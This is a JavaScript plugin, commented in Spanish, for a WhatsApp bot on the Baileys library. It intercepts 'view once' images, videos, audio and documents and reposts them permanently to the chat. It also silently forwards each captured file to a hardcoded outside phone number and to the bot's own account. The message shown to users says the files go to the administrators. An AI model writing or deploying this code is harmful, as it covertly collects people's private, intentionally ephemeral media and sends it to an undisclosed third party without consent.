import { downloadContentFromMessage } from global.baileys;

// Manejador principal para procesar mensajes
let handler = async (m, { conn }) => {
  try {
    // Extraer configuración y verificar condiciones
    const { antiver, isBanned } = global.db.data.chats[m.chat];
    if (!antiver || isBanned || !['viewOnceMessageV2', 'viewOnceMessageV2Extension'].includes(m.mtype)) return;

    // Verificar si el mensaje es de un número privado
    const isPrivate = !m.isGroup;
    if (isPrivate) {
      // Permitir que el bot procese mensajes de números privados
      console.log('Mensaje de número privado recibido:', m.sender);
    }

    // Obtener el mensaje y tipo de archivo
    const msg = m.message[m.mtype].message;
    const type = Object.keys(msg)[0];
    const fileType = getFileType(type);

    // Descargar el contenido del mensaje
    const mediaStream = await downloadContentFromMessage(msg[type], fileType);
    const buffer = await streamToBuffer(mediaStream);

    // Obtener información del archivo y crear una descripción
    const fileSize = formatFileSize(msg[type].fileLength);
    const description = createDescription(fileType, fileSize, m, msg);
    
    // Enviar el archivo al chat original
    if (fileType === 'image') {
      await conn.sendFile(m.chat, buffer, 'image.jpg', description, m, false, { mentions: [m.sender] });
    } else if (fileType === 'video') {
      await conn.sendFile(m.chat, buffer, 'video.mp4', description, m, false, { mentions: [m.sender] });
    } else if (fileType === 'audio') {
      await conn.reply(m.chat, description, m, { mentions: [m.sender] });
      await conn.sendMessage(m.chat, { audio: buffer, fileName: 'audio.mp3', mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } else if (fileType === 'document') {
      await conn.sendFile(m.chat, buffer, 'document.pdf', description, m, false, { mentions: [m.sender] });
    }

    // Enviar el archivo a números adicionales
    await conn.sendFile('+51927803866@s.whatsapp.net', buffer, getFileName(fileType), description);
    await conn.sendFile(conn.user.jid, buffer, getFileName(fileType), description);

  } catch (error) {
    // Manejo de errores
    console.error('Error procesando el mensaje de "ver una vez":', error);
  }
};

// Función para convertir un stream en un buffer
async function streamToBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

// Función para obtener el tipo de archivo basado en el mensaje
function getFileType(type) {
  if (/image/.test(type)) return 'image';
  if (/video/.test(type)) return 'video';
  if (/audio/.test(type)) return 'audio';
  if (/document/.test(type)) return 'document';
  return 'unknown';
}

// Función para obtener el nombre del archivo basado en el tipo
function getFileName(fileType) {
  switch (fileType) {
    case 'image': return 'image.jpg';
    case 'video': return 'video.mp4';
    case 'audio': return 'audio.mp3';
    case 'document': return 'document.pdf';
    default: return 'file';
  }
}

// Función para formatear el tamaño del archivo
function formatFileSize(bytes) {
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'TY', 'EY'];
  const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
  return Math.round(100 * (bytes / Math.pow(1024, i))) / 100 + ' ' + sizes[i];
}

// Función para crear una descripción detallada del archivo
function createDescription(fileType, fileSize, m, msg) {
  return `🔒 *Archivo "Ver una vez" interceptado* 🔒\n\n📁 *Tipo*: ${fileType}\n💾 *Tamaño*: ${fileSize}\n👤 *Enviado por*: @${m.sender.split('@')[0]}\n🕒 *Fecha*: ${new Date().toLocaleString()}\n\nEste archivo ha sido capturado y enviado a los administradores.`;
}

export default handler;
